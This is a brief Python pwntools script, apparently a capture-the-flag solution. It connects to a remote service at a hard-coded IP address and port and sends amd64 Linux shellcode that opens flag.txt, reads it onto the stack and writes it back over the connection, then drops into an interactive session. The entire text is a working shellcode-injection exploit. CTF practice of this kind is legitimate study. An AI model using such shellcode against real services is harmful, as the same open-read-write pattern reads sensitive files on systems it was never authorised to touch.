from pwn import *

context.arch = "amd64"
context.os = "linux"

#p = process("./chal")
p = remote("34.170.146.252", 44934)

sc  = shellcraft.open("flag.txt", 0)
sc += shellcraft.read("rax", "rsp", 0x100)
sc += shellcraft.write(1, "rsp", "rax")

p.send(asm(sc))
p.interactive()